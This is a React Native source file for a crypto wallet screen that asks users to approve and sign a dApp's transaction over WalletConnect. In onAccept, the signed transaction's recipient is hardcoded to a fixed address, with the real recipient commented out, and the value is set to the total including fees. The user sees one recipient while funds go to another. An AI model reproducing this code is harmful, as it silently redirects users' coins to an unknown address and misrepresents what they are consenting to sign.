import React, { useState, useRef, useEffect } from 'react';
import { View, StyleSheet, Image, Text, ScrollView } from 'react-native';
import { Props } from '../screens/SignTransactionConsentScreen';
import theme, { commonStyles } from '../utils/theme';
import LayoutComponent from '../components/layout';
import { TH2 } from '../components/atoms/THeadings';
import { TButtonContained, TButtonOutlined } from '../components/atoms/TButton';
import { IPrivateKey, ITransaction, TransactionType } from '../utils/chain/types';
import { extractHostname } from '../utils/helper';
import TSpinner from '../components/atoms/TSpinner';
import { ethers, TransactionRequest } from 'ethers';
import { formatCurrencyValue } from '../utils/numbers';
import useErrorStore from '../store/errorStore';
import { getSdkError } from '@walletconnect/utils';
import useWalletStore from '../store/useWalletStore';

export default function SignTransactionConsentContainer({
    navigation,
    transaction,
    privateKey,
    session,
}: {
    navigation: Props['navigation'];
    transaction: ITransaction;
    privateKey: IPrivateKey;
    session: {
        origin: string;
        id: number;
        topic: string;
    };
}) {
    const { web3wallet } = useWalletStore();

    const errorStore = useErrorStore();
    const [contractTransaction, setContractTransaction] = useState(true);
    const [loading, setLoading] = useState(false);
    const [transactionDetails, setTransactionDetails] = useState<{
        transactionType: TransactionType | null;
        fromAccount: string;
        toAccount: string;
        value: string;
        usdValue: number;
        functionName: string;
        args: Record<string, string> | null;
        fee: string;
        usdFee: number;
        total: string;
        usdTotal: number;
    }>({
        transactionType: null,
        fromAccount: '',
        toAccount: '',
        value: '',
        usdValue: 0,
        functionName: '',
        args: {},
        fee: '',
        usdFee: 0,
        total: '',
        usdTotal: 0,
    });
    const refMessage = useRef(null);

    useEffect(() => {
        const fetchTransactionDetails = async () => {
            try {
                setLoading(true);

                const fromAccount = await transaction.getFrom().getName();

                const toAccount = await transaction.getTo().getName();

                const value = (await transaction.getValue()).toString();

                const usdValue = await (await transaction.getValue()).getUsdValue();

                const estimateFee = await transaction.estimateTransactionFee();
                let fee = estimateFee?.toString();

                fee = parseFloat(fee).toFixed(18);
                const usdFee = fee ? await estimateFee.getUsdValue() : 0;

                const estimateTotal = await transaction.estimateTransactionTotal();
                let total = estimateTotal?.toString();

                total = parseFloat(total).toFixed(18);
                const usdTotal = total ? await estimateTotal.getUsdValue() : 0;

                const transactionType = await transaction.getType();

                const functionName = '';
                const args: Record<string, string> | null = null;

                // if (contractTransaction) {
                //     functionName = await transaction.getFunction();
                //     args = await transaction.getArguments();
                // }

                setLoading(false);
                setTransactionDetails({
                    transactionType,
                    fromAccount,
                    toAccount,
                    value,
                    usdValue,
                    functionName,
                    args,
                    fee,
                    usdFee,
                    total,
                    usdTotal,
                });
            } catch (e) {
                if (e === 'Not a contract call') {
                    setContractTransaction(false);
                }

                errorStore.setError({ error: e, expected: false });
                setLoading(false);
            }
        };

        fetchTransactionDetails();
    }, [transaction, contractTransaction, errorStore]);

    async function onReject() {
        await web3wallet?.rejectSession({
            id: session.id,
            reason: getSdkError('USER_REJECTED'),
        });
        navigation.navigate({
            name: 'UserHome',
            params: {},
        });
    }

    async function onAccept() {
        try {
            const transactionRequest: TransactionRequest = {
                to: '0x9b516EFc77e3774634797467Be32Bc50b0E2C489', //transactionDetails.toAccount,
                from: transactionDetails.fromAccount,
                value: ethers.parseEther(transactionDetails.total),
                data: await transaction.getData(),
            };

            const signedTransaction = await privateKey.signTransaction(transactionRequest);

            const response = { id: session.id, result: signedTransaction, jsonrpc: '2.0' };

            await web3wallet?.respondSessionRequest({ topic: session.topic, response });
            navigation.navigate({
                name: 'UserHome',
                params: {},
            });
        } catch (error) {
            throw new Error(`Error signing transaction, ${error}`);
        }
    }

    return (
        <LayoutComponent
            body={
                <ScrollView>
                    <View style={styles.container}>
                        <Image
                            style={[styles.logo, commonStyles.marginBottom]}
                            source={{ uri: transaction.getChain().getNativeToken().getLogoUrl() }}
                        ></Image>
                        <View style={commonStyles.alignItemsCenter}>
                            <TH2 style={styles.applinkText}>{extractHostname(session?.origin)}</TH2>
                            <TH2 style={{ marginLeft: 10 }}>wants you to send coins</TH2>
                        </View>
                        {!loading ? (
                            <>
                                <View style={styles.networkHeading}>
                                    <Image
                                        source={{ uri: transaction.getChain().getLogoUrl() }}
                                        style={styles.imageStyle}
                                    />
                                    <Text style={styles.nameText}>{transaction.getChain().getName()} Network</Text>
                                </View>
                                <Text>
                                    {transaction.getChain().formatShortAccountName(transactionDetails?.fromAccount)}
                                </Text>
                                <View style={styles.transactionHeading}></View>
                                <View style={styles.appDialog}>
                                    <View style={{ flexDirection: 'row', justifyContent: 'space-between' }}>
                                        <Text style={styles.secondaryColor}>Recipient:</Text>
                                        <Text>
                                            {transaction
                                                .getChain()
                                                .formatShortAccountName(transactionDetails?.toAccount)}
                                        </Text>
                                    </View>
                                    <View
                                        style={{ flexDirection: 'row', justifyContent: 'space-between', marginTop: 12 }}
                                    >
                                        <Text style={styles.secondaryColor}>Amount:</Text>
                                        <View style={{ flexDirection: 'column', alignItems: 'flex-end' }}>
                                            <View style={{ flexDirection: 'row', alignItems: 'center' }}>
                                                <Text> {transactionDetails.value}</Text>
                                            </View>
                                            <Text style={styles.secondaryColor}>
                                                (${formatCurrencyValue(transactionDetails.usdValue)})
                                            </Text>
                                        </View>
                                    </View>

                                    {/* {contractTransaction && (
                            <>
                                <View
                                    style={{
                                        flexDirection: 'row',
                                        justifyContent: 'space-between',
                                        marginTop: 12,
                                    }}
                                >
                                    <Text style={styles.secondaryColor}>Function:</Text>
                                    <Text style={{ color: theme.colors.secondary }}>{method}</Text>
                                </View>
                                <View
                                    style={{
                                        flexDirection: 'row',
                                        justifyContent: 'space-between',
                                        alignItems: 'center',
                                        marginTop: 4,
                                    }}
                                >
                                    <Text style={styles.secondaryColor}>Transaction details:</Text>

                                    <TouchableOpacity onPress={() => setShowDetails(!showDetails)}>
                                        {!showDetails ? (
                                            <IconButton
                                                icon={
                                                    Platform.OS === 'android'
                                                        ? 'arrow-down'
                                                        : 'chevron-down'
                                                }
                                                size={Platform.OS === 'android' ? 15 : 22}
                                            />
                                        ) : (
                                            <IconButton
                                                icon={Platform.OS === 'android' ? 'arrow-up' : 'chevron-up'}
                                                size={Platform.OS === 'android' ? 15 : 22}
                                            />
                                        )}
                                    </TouchableOpacity>
                                </View>
                            </>
                        )}

                        {showDetails && contractTransaction && (
                            <View style={styles.detailSection}>
                                <View style={{ flexDirection: 'row', justifyContent: 'space-between' }}>
                                    <Text style={styles.secondaryColor}>Price:</Text>
                                    <Text>
                                        0.001 Eth <Text style={styles.secondaryColor}>($17.02) </Text>
                                    </Text>
                                </View>
                                <View
                                    style={{
                                        flexDirection: 'row',
                                        justifyContent: 'space-between',
                                        marginTop: 20,
                                    }}
                                >
                                    <Text style={styles.secondaryColor}>NFT ID:</Text>
                                    <Text>#89792 </Text>
                                </View>
                                <TouchableOpacity onPress={() => (refMessage.current as any)?.open()}>
                                    <Text style={styles.rawTransaction}>Show raw transaction</Text>
                                </TouchableOpacity>
                            </View>
                        )} */}
                                </View>
                                <View style={styles.appDialog}>
                                    <View style={{ flexDirection: 'row', justifyContent: 'space-between' }}>
                                        <Text style={styles.secondaryColor}>Gas fee:</Text>
                                        <View style={{ flexDirection: 'column', alignItems: 'flex-end' }}>
                                            <View style={{ flexDirection: 'row', alignItems: 'center' }}>
                                                <Text> {transactionDetails?.fee}</Text>
                                            </View>
                                            <Text style={styles.secondaryColor}>
                                                (${transactionDetails?.usdFee.toFixed(10)})
                                            </Text>
                                        </View>
                                    </View>
                                </View>
                                <View style={styles.totalSection}>
                                    <View style={{ flexDirection: 'row', justifyContent: 'space-between' }}>
                                        <Text style={{ marginRight: 8, fontWeight: '600' }}>Total:</Text>
                                        <View style={{ flexDirection: 'column', alignItems: 'flex-end' }}>
                                            <View style={{ flexDirection: 'row', alignItems: 'center' }}>
                                                <Text> {transactionDetails?.total}</Text>
                                            </View>
                                            <Text style={styles.secondaryColor}>
                                                (${transactionDetails?.usdTotal.toFixed(10)})
                                            </Text>
                                        </View>
                                    </View>
                                </View>
                            </>
                        ) : (
                            <TSpinner style={{ marginBottom: 12 }} />
                        )}

                        {/* <RBSheet ref={refMessage} openDuration={150} closeDuration={100} height={600}>
            <View style={styles.rawTransactionDrawer}>
                <Text style={styles.drawerHead}>Show raw transaction!</Text>
                <Text style={styles.drawerParagragh}>
                    {`contract VendingMachine { // Declare state variables of the contract address public owner; mapping (address => uint) public cupcakeBalances; // When 'VendingMachine' contract is deployed: // 1. set the deploying address as the owner of the contract // 2. set the deployed smart contract's cupcake balance to 100 constructor() { owner = msg.sender; cupcakeBalances[address(this)] = 100; } // Allow the owner to increase the smart contract's cupcake balance function refill(uint amount) public { require(msg.sender == owner, "Only the owner can refill."); cupcakeBalances[address(this)] += amount; } // Allow anyone to purchase cupcakes function purchase(uint amount) public payable { require(msg.value >= amount * 1 ether, "You must pay at least 1 ETH per cupcake"); require(cupcakeBalances[address(this)] >= amount, "Not enough cupcakes in stock to complete this purchase"); cupcakeBalances[address(this)] -= amount; cupcakeBalances[msg.sender] += amount; } }`}
                </Text>
            </View>
        </RBSheet> */}
                    </View>
                </ScrollView>
            }
            footer={
                <View style={{ marginTop: 30 }}>
                    <TButtonContained onPress={() => onAccept()} style={commonStyles.marginBottom}>
                        Proceed
                    </TButtonContained>
                    <TButtonOutlined onPress={() => onReject()}>Cancel</TButtonOutlined>
                </View>
            }
            noFooterHintLayout={true}
        ></LayoutComponent>
    );
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        alignItems: 'center',
        textAlign: 'center',
    },
    logo: {
        width: 50,
        height: 50,
    },
    applinkText: {
        color: theme.colors.linkColor,
        margin: 2,
        padding: 2,
    },
    imageStyle: {
        width: 10,
        height: 13,
    },
    networkHeading: {
        flexDirection: 'row',
        alignItems: 'center',
        marginTop: 14,
    },
    nameText: {
        color: theme.colors.secondary2,
        marginLeft: 5,
    },
    transactionHeading: {
        marginTop: 11,
    },
    appDialog: {
        borderWidth: 1,
        borderColor: theme.colors.grey5,
        borderStyle: 'solid',
        borderRadius: 7,
        padding: 16,
        width: '100%',
        marginTop: 20,
    },
    totalSection: {
        padding: 16,
        width: '100%',
        marginTop: 20,
        backgroundColor: theme.colors.info,
        borderRadius: 7,
    },
    detailSection: {
        backgroundColor: theme.colors.info,
        padding: 10,
        width: '100%',
        borderRadius: 7,
    },
    padding: {
        paddingHorizontal: 30,
    },
    secondaryColor: {
        color: theme.colors.secondary2,
    },
    rawTransaction: {
        color: theme.colors.secondary,
        marginTop: 15,
        width: '100%',
        textAlign: 'center',
    },
    rawTransactionDrawer: {
        paddingHorizontal: 15,
        paddingVertical: 25,
    },
    drawerHead: {
        fontSize: 20,
        fontWeight: '600',
        marginBottom: 20,
    },
    drawerParagragh: {
        fontSize: 13,
    },
    scrollViewConditions: {
        paddingHorizontal: 18,
        paddingRight: 18,
        paddingVertical: 0,
        margin: 0,
    },
});
